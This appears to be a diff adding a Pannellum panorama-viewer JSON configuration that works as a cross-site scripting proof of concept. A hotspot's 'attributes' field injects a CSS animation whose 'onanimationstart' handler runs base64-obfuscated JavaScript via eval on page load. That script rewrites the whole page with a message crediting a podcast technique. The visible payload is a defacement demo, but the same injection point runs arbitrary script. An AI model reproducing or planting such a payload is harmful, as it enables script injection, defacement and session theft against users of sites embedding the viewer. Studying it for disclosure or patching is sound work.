@@ -1,0 +1,16 @@
+{
+  "autoLoad": true,
+  "panorama": "https://pannellum.org/images/cerro-toco-0.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:100px; height:100px; z-index:99999; animation: pnlm-mv 0.001s 1 forwards",
+        "onanimationstart": "eval(atob('ZG9jdW1lbnQub3BlbigpO2RvY3VtZW50LndyaXRlKCI8aHRtbD48Ym9keSBzdHlsZT1mb250LWZhbWlseTpzeXN0ZW0tdWk7cGFkZGluZzoyZW0+PGgxPlRoaXMgcGFnZSBjb250ZW50IGhhcyBiZWVuIHJlcGxhY2VkIHVzaW5nIGEgdGVjaG5pcXVlIGRlc2NyaWJlZCBvbiB0aGUgQ29tbXVuaXR5IFNlcnZpY2UgSG91ciBwb2RjYXN0LjwvaDE+PC9ib2R5PjwvaHRtbD4iKTtkb2N1bWVudC5jbG9zZSgpOw=='))"
+      }
+    }
+  ]
+}
